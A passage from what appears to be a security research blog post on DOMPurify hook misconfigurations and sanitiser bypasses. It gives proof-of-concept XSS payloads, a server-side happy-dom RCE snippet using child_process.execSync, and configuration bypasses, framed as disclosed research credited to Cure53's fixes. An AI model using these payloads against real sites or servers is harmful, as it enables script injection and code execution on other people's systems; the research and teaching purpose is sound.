    _executeHooks(hooks.beforeSanitizeAttributes, currentNode, null);

    const { attributes } = currentNode;
```

**Fig. 24**: DOMPurify's 3.2.4 \_sanitizeAttributes function ( [ref](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L1272)).

Due to this, depending on the developer's node manipulation in that hook, it might be possible to create a DOM Clobbering scenario for the [destructuring assignment](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment).

```js
// This is an example
DOMPurify.addHook("beforeSanitizeAttributes", (currentNode) => {
    if (currentNode.id) currentNode.id = currentNode.id.trim();
})
```

Dom-Explorer

**Fig. 25**: DOMPurify dangerous beforeSanitizeAttributes attributes manipulation.

As we can see, if the developer updates attribute values in [beforeSanitizeAttributes](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L1274), including the id attribute, it is possible to set up a second-order DOM Clobbering that would bypass DOMPurify, even in the latest version.

_This also works with the uponSanitizeElement and afterSanitizeElements hooks, which occur after DOMPurify's DOM Clobbering checks._

### [Latest \| afterSanitizeAttribute & (string replacement \|\| attribute manipulation)](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations\#afterSanitizeAttribute-replacement-manipulation)

This one is highly inspired by [@kinugawamasato](https://x.com/kinugawamasato)'s work on dangerous replacements occurring after the sanitization process (covered in the [this](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#bad-usage-replacing-the-output) section).

In short, if any string replacement (ideally to empty) is used in the afterSanitizeAttribute hook (on innerHTML, attribute values, etc.), it might be possible to create a </style>, </title>, or similar string within an attribute value. This would happen **after** the regex check has been performed ( [regex check](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L1320) \| [afterSanitizeAttribute](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L1402)), allowing for a potential bypass.

```js
// Yes, I know this could already lead to an XSS if there is no CSP on the website, but this is just an example :p
DOMPurify.addHook("afterSanitizeAttributes", (currentNode) => {
    if (currentNode.dataset.x) currentNode.dataset.x = currentNode.dataset.x.replace("prefix-", "");
})
```

Dom-Explorer

**Fig. 26**: Example of dangerous .replace() usage in the afterSanitizeAttributes hook.

_I don't think it's useful to provide the full bypass payload, as it would be almost the same as the uponSanitizeAttribute misconfiguration._

For this misconfiguration, especially, I would like to provide a more interesting example that occurs when using the .toUpperCase method :)

```js
// This is an example
DOMPurify.addHook("afterSanitizeAttributes", (currentNode) => {
    if (currentNode.dataset.x) currentNode.dataset.x = currentNode.dataset.x.toUpperCase();
})
```

**Fig. 27**: Example of dangerous .toUpperCase() usage in the afterSanitizeAttributes hook.

> Why can using .toUpperCase() be dangerous?

Well, this is because of the Unicode normalization that occurs when using .toUpperCase() or .toLowerCase().

```js
'ß'.toUpperCase() => "SS"
'İ'.toLowerCase() => "i̇"
'ı'.toUpperCase() => "I"
'ſ'.toUpperCase() => "S"
'K'.toLowerCase() => "k"
'ﬀ'.toUpperCase() => "FF"
'ﬁ'.toUpperCase() => "FI"
'ﬂ'.toUpperCase() => "FL"
'ﬃ'.toUpperCase() => "FFI"
'ﬄ'.toUpperCase() => "FFL"
'ﬅ'.toUpperCase() => "ST"
'ﬆ'.toUpperCase() => "ST"
```

**Fig. 28**: List of normalized Unicode characters by the .toUpperCase() and .toLowerCase() methods.

From the list above, we can see that ﬆ will be replaced with ST, which is exactly what we need for a </STYLE> tag closure!

Dom-Explorer

**Fig. 29**: Example of dangerous .toUpperCase() usage in the afterSanitizeAttributes hook.

_The .toUpperCase() and .toLowerCase() normalization was already highlighted by [@garethheyes](https://x.com/garethheyes) a few months ago ( [ref](https://x.com/garethheyes/status/1858572181472768072)), but I felt like providing an mXSS example of it would be great! :p_

_Btw, there are some character matches in Transfer-Encoding, there might be something to explore there (cc [@albinowax](https://x.com/albinowax)) ;D_

### [Latest \| Node manipulation (insertBefore)](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations\#node-manipulation-insertBefore)

For this one, similar to the second uponSanitizeAttributes misconfiguration, we are primarily taking advantage of how hooks actually work.

As we saw in the first article, DOMPurify iterates over each node one by one, from the top of the tree to the bottom.

![sanitizing_process](https://mizu.re/articles/articles/vuln06_dompurify/article02/images/sanitizing_process.png)

**Fig. 30**: Highly simplified version of the sanitization process order.

Because of this, moving a node from below to above the current node in the tree will effectively hide it from the sanitization process. For example:

```js
// This is an example
DOMPurify.addHook("beforeSanitizeElements", (currentNode) => {
    if (currentNode.id === "toRemove") {
        currentNode.parentNode.insertBefore(currentNode.firstChild, currentNode);
        currentNode.remove();
    }
})
```

Dom-Explorer

**Fig. 31**: Example of a custom hook DOMPurify bypass using .insertBefore.

_Without a doubt, using insertBefore is one of many ways to move a node above the currently sanitized node._

### [Latest \| Base href pollution](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations\#base-href-pollution)

For the last 3 misconfigurations, we are going to focus on examples that, even if they don't lead to a full bypass, can be interesting gadgets in custom hooks.

When using hooks, the context of URI attributes is based on the DOM of the DOMParser() generated document. For example:

```js
// Executed from https://cure53.de/purify
var tree = (new DOMParser()).parseFromString('<a id="example" href="/poc"></a>', "text/html");
tree.getElementById("example").href;
// [OUTPUT] https://cure53.de/poc
```

**Fig. 32**: Showcase of the .href attribute behavior.

Therefore, while this newly created document doesn't have its own parsing context and retains the origin of the "creator" document, it can still have its own <base href>:

```js
// Executed from https://cure53.de/purify
var tree = (new DOMParser()).parseFromString(`
<base href="https://mizu.re">
<a id="example" href="/poc"></a>
`, "text/html");
tree.getElementById("example").href;
// [OUTPUT] https://mizu.re/poc
```

**Fig. 33**: Example of base href pollution in a new DOMParser document.

This isn't something new, and it makes sense since this is exactly what the <base> tag is used for. However, it becomes very interesting when trying to bypass hook checks.

> The <base> tag is disallowed by default in DOMPurify. How could this be useful?

Well, that's not entirely true. DOMPurify does remove the <base> tag by default. However, by default, it doesn't sanitize, and consume the content of the <head> tag in the generated DOM. :)

```js
// Executed from https://cure53.de/purify
DOMPurify.addHook("beforeSanitizeElements", (currentNode) => {
    if (currentNode.nodeName === "A") {
        console.log(currentNode.href)
    }
})

DOMPurify.sanitize(`
<head>
<base href="https://mizu.re">
</head>
<body>
<a href="/poc"></a>
<body>
`);
// [LOGS] https://mizu.re/poc
```

**Fig. 34**: Example of base href pollution through <head> in DOMPurify.

> At this point, you might be wondering—how could this be useful?

To answer this, we need to take a step back and remember that this allows the DOMPurify document to have a different origin than the current document. Because of this, here's what DOMPurify sees versus what the DOM receives:

```js
// Executed from https://cure53.de/purify
DOMPurify.addHook("beforeSanitizeElements", (currentNode) => {
    if (currentNode.nodeName === "A") {
        console.log(currentNode.href)
    }
})

document.body.innerHTML = DOMPurify.sanitize(`
<head>
<base href="https://mizu.re">
</head>
<body>
<a id="example" href="/poc"></a>
<body>
`);

console.log(document.getElementById("example").href);
// [LOGS]
// https://mizu.re/poc   <---- .href for DOMPurify
// https://cure53.de/poc <---- .href for the inserted document
```

**Fig. 35**: href confusion between the sanitized document and the receiver document.

From this, some checks could be bypassed depending on the specific validations implemented by the developer for URL-based attributes. But what if we try to go a bit further?

In the example above, in the end, the .href value points to the current domain, which could be improved. To achieve the opposite, let's take the following challenge as an example:

```js
DOMPurify.addHook("beforeSanitizeElements", (node) => {
    if (node.nodeType === 1 && node.tagName.toUpperCase() === "SCRIPT") {
        // The namespace check is mandatory; otherwise, the check could be bypassed by using both .src and .href in the SVG namespace, as .href has priority over .src (@Geluchat 🫶)
        if (node.namespaceURI !== "http://www.w3.org/1999/xhtml" || node.src !== "https://mizu.re/try_harder.js") {
            node.remove();
        } else {
            node.innerText = "";
            node.innerHTML = "";
        }
    }
});
DOMPurify.sanitize(user_input, { ADD_TAGS: [ "script" ] });
```

**Fig. 36**: Small hook challenge.

_I agree, this is not the most realistic scenario, but it's always fun to take on a small challenge to push things one step further :)_

As we can see, the <script> tag is allowed, but only with a .src is equal to [https://mizu.re/try\_harder.js](https://mizu.re/try_harder.js). While this might seem like an "impossible" challenge, we can take advantage of 3 key points:

1\. The [beforeSanitizeAttributes](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L1274) hook occurs **before** attribute normalization, as mentioned in the first article ( [ref](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes#why-are-mutation-xss-possible#second-order-dom-clobbering)).

2\. There are a few characters that are trimmed by the .trim() function but are **not** considered valid "space" at the beginning of an attribute.

```js
for (let i=0; i<=0xFF; i++) {
    if (String.fromCharCode(i)+"a".trim() === "a") { console.log(i) }
}
// 9, 10, 11, 12, 13, 32, 160
```

**Fig. 37**: List of characters trimmed by the .trim() function..

```html
<!-- Executed from https://mizu.re -->
<a id="example1" href="&#x20;https://cure.53.be/poc"></a>
<a id="example2" href="&#xa0;https://cure.53.be/poc"></a>
<script>
    console.log(example1.href); // https://cure.53.be/poc
    console.log(example2.href); // https://mizu.re/%C2%A0https://cure.53.be/poc
</script>
```

**Fig. 38**: Example of valid and invalid attribute leading whitespace values.

3\. The <base> tag trick is your best friend.

Using the points above, it is possible to have an .href attribute that initially points to [https://mizu.re/](https://mizu.re/) (thanks to the <base> tag) at the [beforeSanitizeAttributes](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L1274) hook timing but then resolves to [https://challenges.mizu.re/](https://challenges.mizu.re/) after normalization.

```html
<html><head><base href="https://mizu.re/"></head><body><script src="&#160;https://challenges.mizu.re/../../../../try_harder.js"></script></body></html>
```

Dom-Explorer

**Fig. 39**: Abuse base href pollution to bypass hook conditions.

_I'm using path traversal to remove the [https://challenges.mizu.re](https://challenges.mizu.re/) domain from the hook check._

### [Latest \| nodeName namespace case confusion](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations\#nodeName-namespace-case-confusion)

I've seen several developers who, for some reason, were using hooks to block or limit the usage of specific tags. For example:

```js
DOMPurify.addHook("beforeSanitizeElements", (currentNode) => {
    if (currentNode.nodeName === "STYLE") {
        currentNode.remove();
        // Or sanitize the <style> content
    }
})
```

**Fig. 40**: Example of custom beforeSanitizeElements to filter <style> tags.

Something that is not well known and makes the above check incomplete is that the nodeName case depends on the namespace.

```html
<style id="example1"></style>
<svg>
    <style id="example2"></style>
</svg>
<script>
    console.log(example1.nodeName); // STYLE
    console.log(example2.nodeName); // style
</script>
```

**Fig. 41**: nodeName case discrepancy depending on the associated node namespace.

Due to this, if the developer forgets to use .toLowerCase() or .toUpperCase(), the check can simply be bypassed as follows:

Dom-Explorer

**Fig. 42**: nodeName namespace case confusion.

### [Latest \| beforeSanitizeElements === DOM Clobbering DOS](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations\#before-sanitize-elements-dos)

To end with hooks misconfiguration, I just want to highlight a less looked-at issue in HTML sanitizers (DOS), which could be quite powerful depending on the application's context. In fact, the beforeSanitizeElements event occurs **before** the DOM Clobbering checks made by the [\_isClobbered](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L977) function. Because of that, any API call made in that hook can be clobbered and force the sanitization to crash:

```js
DOMPurify.addHook("beforeSanitizeElements", (currentNode) => {
    currentNode.remove();
})
```

Dom-Explorer

**Fig. 43**: DOMPurify beforeSanitizeElements DOM CLobbering DOS.

## [🗃️ Miscellaneous](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations\#miscellaneous)

### [Introduction](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations\#miscellaneous-introduction)

Before concluding this article series, I would like to share a few interesting things that might be useful for future research or bug hunters!

### [DOMPurify > 3.1.2 + SAFE\_FOR\_XML: false === bypass](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations\#dompurify-gt-3.1.2-safe-for-xml)

This might be obvious, but it's important to mention it again. Since DOMPurify's security now relies on the following regex, setting SAFE\_FOR\_XML to false results in a full downgrade of the sanitization process.

```js
if (SAFE_FOR_XML && regExpTest(/((--!?|])>)|<\/(style|title)/i, value)) {
_removeAttribute(name, currentNode);
    continue;
}
```

Dom-Explorer

**Fig. 44**: DOMPurify \> 3.1.2 SAFE\_FOR\_XML bypass.

### [DOMPurify 3.1.3 & 3.1.4 nested node restriction bypass](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations\#dompurify-3.1.3-3.1.4-nested-node-bypass)

In DOMPurify version 3.1.4, nested node protections are still present, and second-order DOM Clobbering has been fixed. However, I managed to find a way to bypass the nested node limit in this version, which is quite useful for chaining with previously seen gadgets.

```js
try {
    if (namespaceURI) {
        currentNode.setAttributeNS(namespaceURI, name, value);
    } else {
        /* Fallback to setAttribute() for browser-unrecognized namespaces e.g. "x-schema". */
        currentNode.setAttribute(name, value);
    }

    if (_isClobbered(currentNode)) {
        _forceRemove(currentNode);
    } else {
        arrayPop(DOMPurify.removed);
    }
} catch (_) {}
```

**Fig. 45**: DOMPurify 3.1.3 second-order DOM Clobbering fix ( [ref](https://github.com/cure53/DOMPurify/blob/3fe78d7501103832166613bb1452985dd4674008/src/purify.js#L1381)).

To fix the second-order DOM Clobbering issue, [@cure53berlin](https://x.com/cure53berlin) decided to check for DOM Clobbering using [\_isClobbered](https://github.com/cure53/DOMPurify/blob/7517e9c475dbc1c7f8535a60f17bb55aabd52ba6/src/purify.js#L956) at the end of [\_sanitizeAttributes](https://github.com/cure53/DOMPurify/blob/7517e9c475dbc1c7f8535a60f17bb55aabd52ba6/src/purify.js#L1262) within a try \[...\] catch block. If a clobbered node is found after attribute normalization, it is removed using the [\_forceRemove](https://github.com/cure53/DOMPurify/blob/7517e9c475dbc1c7f8535a60f17bb55aabd52ba6/src/purify.js#L809) function.

```js
const _forceRemove = function (node) {
    arrayPush(DOMPurify.removed, { element: node });

    try {
        // eslint-disable-next-line unicorn/prefer-dom-node-remove
        node.parentNode.removeChild(node);
    } catch (_) {
        node.remove();
    }
};
```

**Fig. 46**: DOMPurify's 3.1.4 \_forceRemove function ( [ref](https://github.com/cure53/DOMPurify/blob/7517e9c475dbc1c7f8535a60f17bb55aabd52ba6/src/purify.js#L809)).

Once again, a try \[...\] catch block is used to handle cases where .parentNode is clobbered or doesn't exist. But what if we clobber both the .parentNode and the .remove method? In that case, an error will be raised and handled by the [\_sanitizeAttributes](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L1272) try \[...\] catch block. This won't cause DOMPurify to crash but will prevent the node from being removed!

Dom-Explorer

**Fig. 47**: DOMPurify 3.1.4 nested node restriction bypass.

_Like the DOMPurify 3.1.2 bypass, this one doesn't work on Firefox._

### [JSON to HTML libraries](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations\#json-to-html-libraries)

I haven't found a valid example so far, but I think it's still interesting enough to mention. If, one day, a library fully generates an HTML DOM based on JSON, sanitizes it using DOMPurify, but then returns the result as a string, such a configuration could be easily bypassed:

```js
function jsonToHtmlTree(json) {
    if (!json || !json.tag) return document.createTextNode("");

    // Create element
    let element = document.createElement(json.tag);

    // Set attributes if they exist
    if (json.attributes) {
        for (let key in json.attributes) {
            element.setAttribute(key, json.attributes[key]);
        }
    }

    // Add text content if it exists
    if (json.text) {
        element.textContent = json.text;
    }

    // Recursively process child elements
    if (json.childs && Array.isArray(json.childs)) {
        json.childs.forEach(child => {
            element.appendChild(jsonToHtmlTree(child));
        });
    }

    return element;
}

DOMPurify.sanitize(jsonToHtmlTree({
    "tag": "div",
    "attributes": { "id": "container" },
    "childs": [\
        { "tag": "style", "text": "Hello World!</style><img src=x onerror=alert()>", "childs": [\
            { "tag": "p" },\
        ]}\
    ]
}))
// [OUTPUT] <div id="container"><style>Hello World!</style><img src=x onerror=alert()><p></p></style></div>'
```

**Fig. 48**: Example of a dangerous JSON-based generated HTML tree to bypass DOMPurify.

_Thanks ChatGPT for the vulnerable function x)_

This is due to the following sanitization snippet:

```js
if (
    currentNode.hasChildNodes() &&
    !_isNode(currentNode.firstElementChild) &&
    regExpTest(/<[/\w]/g, currentNode.innerHTML) &&
    regExpTest(/<[/\w]/g, currentNode.textContent)
) {
    _forceRemove(currentNode);
    return true;
}
```

**Fig. 49**: DOMPurify dangerous text node check ( [ref](https://github.com/cure53/DOMPurify/blob/1c1b1838625851939d4b86436feeb3e3ccb7dbb6/src/purify.ts#L1047)).

In short, if a node has a child node (which is not text), then its .textContent isn't verified. When applied to a <style> tag, this makes it possible to fully bypass the sanitization.

### [Content-Type without charset=](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations\#content-type-no-charset)

This has already been well covered by the amazing research of [@scryh\_](https://x.com/scryh_) ( [ref](https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/)), but I think it's still important to mention here, as it's still quite common. In the case of server-side DOMPurify usage (or blob: generation usage), if no charset is provided in the response Content-Type header, it is possible to fully bypass DOMPurify in the following way:

```js
const createDOMPurify = require("dompurify");
const { JSDOM } = require("jsdom");
const http = require("http");

const server = http.createServer((req, res) => {
    const window = new JSDOM("").window;
    const DOMPurify = createDOMPurify(window);
    const clean = DOMPurify.sanitize('<a id="\x1b$B"></a>\x1b(B<a id="><img src=x onerror=alert(1)>"></a>');

    res.statusCode = 200;
    res.setHeader("Content-Type", "text/html");
    res.end(clean);
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log("Server is running on port ${PORT}");
});
```

**Fig. 50**: Proof of Concept for missing Content-Type charset DOMPurify bypass.

### [CVE-2024-51757 - happy-dom < 15.10.0 RCE](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations\#cve-2024-51757-happy-dom-rce)

When using DOMPurify on the server side, [@cure53berlin](https://x.com/cure53berlin) **strongly recommend** using the latest version of [JSDOM](https://www.npmjs.com/package/jsdom), which aims to provide a "pure-JavaScript implementation of many web standards".

However, in the [DOMPurify README](https://github.com/cure53/DOMPurify?tab=readme-ov-file#running-dompurify-on-the-server), they highlight that libraries like [happy-dom](https://github.com/capricorn86/happy-dom) exist but are not considered safe. After reading that, I decided to look at the happy-dom library and discovered the following full bypass:

```js
const createDOMPurify = require("dompurify");
const { Window } = require("happy-dom");

(async () => {
    const window = new Window();
    const DOMPurify = createDOMPurify(window);

    console.log(
        DOMPurify.sanitize("a<x><img onerror='alert()'></x>");
    )

    await window.happyDOM.abort();
    window.close();
})()
// a<img onerror="alert()">
```

**Fig. 51**: DOMPurify + happy-dom XSS bypass.

And the following RCE for [happy-dom](https://github.com/capricorn86/happy-dom) versions < 15.10.0:

```js
const createDOMPurify = require("dompurify");
const { Window } = require("happy-dom");

(async () => {
    const window = new Window();
    const DOMPurify = createDOMPurify(window);
    DOMPurify.sanitize("a<script src=\"https://mizu.re/'+require('child_process').execSync('ls')+'\"></script>"); // :(

    await window.happyDOM.abort();
    window.close();
})()
```

**Fig. 52**: DOMPurify + happy-dom < 15.10.0 RCE.

### [DOMPurify 2.3.1 ≤ 3.1.2 specific configuration bypass](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations\#dompurify-2.3.1-3.1.2-specific-bypass)

To end up with all these DOMPurify bypasses and tricks, I'd like to share a specific configuration bypass I found while looking for restrictive configuration bypasses in older versions. I haven't managed to find a valid generic bypass yet, but this would be a very interesting topic, as many websites don't update DOMPurify and instead rely on very strict configurations.

Here's the bypass, since it combines tricks from all the DOMPurify articles I've released so far, I'll leave it as an exercise for the reader to understand ;)

```json
{
    "FORBID_TAGS": ["svg","math"],
    "FORBID_CONTENTS": [""]
}
```

Dom-Explorer

**Fig. 53**: DOMPurify 2.3.1 ≤ 3.1.2 restricted tags and empty FORBID\_CONTENTS bypass.

_I'm forbidding <svg> and <math> in this example, but it works with USE\_PROFILES: { html: true } as well._

### [🏁 Conclusion](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations\#bibliography)

To conclude, this article has covered the following well-known, basic, DOMPurify misconfigurations: dangerous allow-lists, unsafe URI attribute configurations, improper server-side and client-side usage... Additionally, beyond default DOMPurify misconfigurations, DOMPurify's hooks provide a significant attack surface due to the flexibility developers have when implementing them. Moreover, it's important to keep in mind that this article does not aim to list every possible dangerous scenario, and I am sure that many more dangerous patterns related to DOMPurify's hooks exist. It is my hope that the reader will take the principles in this article and apply in their own unique situations, despite the fact that they may differ from the provided examples.

As we have seen in this two-article series, the complexity of HTML makes developing a secure HTML sanitizer extremely difficult, even for a company like [Cure53](https://cure53.de/). In addition to everything discussed in this article, there are many other vectors worth exploring when attempting to bypass a sanitizer. For instance, "script gadgets" (as termed by Google researchers in their 2017 [research](https://github.com/google/security-research-pocs/tree/master/script-gadgets)) are widespread, making the creation of a perfect sanitizer impossible without overly restrictive configuration.

Nevertheless, I would like to thank [Cure53](https://cure53.de/) once again for their kindness and responsiveness regarding all the issues that have been reported and fixed. I have no doubt in saying that DOMPurify reflects the state of the art in terms of HTML sanitization and is the perfect library to use to protect a website from user-provided HTML input!

Finally, I hope you enjoyed this DOMPurify security series as much as I did. It's time for me to shift my focus to new libraries and topics. See you soon!

**</dompurify-research>**

### [📚 Bibliography](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations\#bibliography)

- cure53. DOMPurify. [https://github.com/cure53/DOMPurify](https://github.com/cure53/DOMPurify)
- vakzz. Gitlab Stored XSS in markdown when redacting references [https://gitlab.com/gitlab-org/gitlab/-/issues/213273](https://gitlab.com/gitlab-org/gitlab/-/issues/213273)
- Dominic Couture. Gitlab Prevent CSP bypass that use Rails' ujs data links. [https://gitlab.com/gitlab-org/gitlab/-/issues/336138](https://gitlab.com/gitlab-org/gitlab/-/issues/336138)
- @kinugawamasato. CVE-2020-11022 - jQuery <= 3.4.1. [https://github.com/jquery/jquery/security/advisories/GHSA-gxr4-xjj5-5px2](https://github.com/jquery/jquery/security/advisories/GHSA-gxr4-xjj5-5px2)
- cure53. DOMPurify issue #761. [https://github.com/cure53/DOMPurify/issues/761](https://github.com/cure53/DOMPurify/issues/761)
- @kinugawamasato. CVE-2023-48219 - TinyMCE < 6.7.3. [https://vulnerabledoma.in/tinymce/CVE-2023-48219.html](https://vulnerabledoma.in/tinymce/CVE-2023-48219.html)
- @kevin\_mizu. DOMLogger++. [https://github.com/kevin-mizu/domloggerpp](https://github.com/kevin-mizu/domloggerpp)
- jgraph. Draw.io. [https://github.com/jgraph/drawio](https://github.com/jgraph/drawio)
- Mozilla. Destructuring assignment. [https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Destructuring\_assignment](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment)
- @garethheyes. Characters transformed when using uppercase. [https://x.com/garethheyes/status/1858572181472768072](https://x.com/garethheyes/status/1858572181472768072)
- @scryh\_. Encoding Differentials: Why Charset Matters. [https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/](https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/)
- jsdom. JSDOM. [https://www.npmjs.com/package/jsdom](https://www.npmjs.com/package/jsdom)
- capricorn86. happy-dom. [https://github.com/capricorn86/happy-dom](https://github.com/capricorn86/happy-dom)
- Google. Breaking XSS mitigations
via Script Gadgets. [https://github.com/google/security-research-pocs/tree/master/script-gadgets](https://github.com/google/security-research-pocs/tree/master/script-gadgets)

[_keyboard\_arrow\_left_ An 18 years old bug](https://mizu.re/post/an-18-years-old-bug)

[Exploring the DOMPurify library: Bypasses and Fixes (1/2) _keyboard\_arrow\_right_](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes)